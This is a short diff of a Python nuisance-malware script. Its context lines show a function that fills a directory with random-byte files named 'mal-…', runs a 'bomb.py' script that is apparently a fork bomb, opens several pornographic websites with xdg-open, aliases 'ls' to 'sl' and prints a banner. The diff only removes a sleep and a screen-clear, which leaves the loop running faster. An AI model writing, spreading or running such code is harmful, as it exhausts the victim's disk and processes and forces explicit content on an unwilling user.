@@ -21,12 +21,10 @@ def forked():
     with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
       file.write(malwar + str(random.randbytes(999)))
     os.system("python bomb.py")
-    time.sleep(1)
     os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
     os.system('alias ls="sl"') 
     os.system("clear")
     print(malwar)
-    os.system("clear")
     
 @atexit.register
 def goodbye():
